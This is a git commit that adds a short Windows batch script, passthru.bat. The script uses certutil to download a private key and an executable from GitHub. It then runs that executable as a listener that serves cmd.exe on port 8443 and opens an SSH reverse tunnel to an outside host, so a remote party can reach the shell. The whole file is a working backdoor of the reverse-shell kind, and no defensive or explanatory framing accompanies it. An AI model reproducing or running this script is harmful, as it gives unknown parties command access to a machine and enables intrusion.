76f3f60370af0499bbe0249157d271525b106004
Rajiv <26450813+rdasm@users.noreply.github.com>
2021-02-28 16:33:19 -0700

    Add files via upload

---
+++ passthru.bat
@@ -0,0 +1,9 @@
+@echo off
+
+certutil -urlcache -f "https://raw.githubusercontent.com/rdasm/passthru/main/passthru.pem" PT.pem
+certutil -urlcache -f "https://github.com/rdasm/passthru/raw/main/passthru.exe" PT.exe
+
+start /b pt.exe -vv -L -p 8443 -e cmd.exe
+
+ssh -N -R2222:127.0.0.1:8443 -i PT.pem ubuntu@mypro.myspacebox.net -p 443
+ 
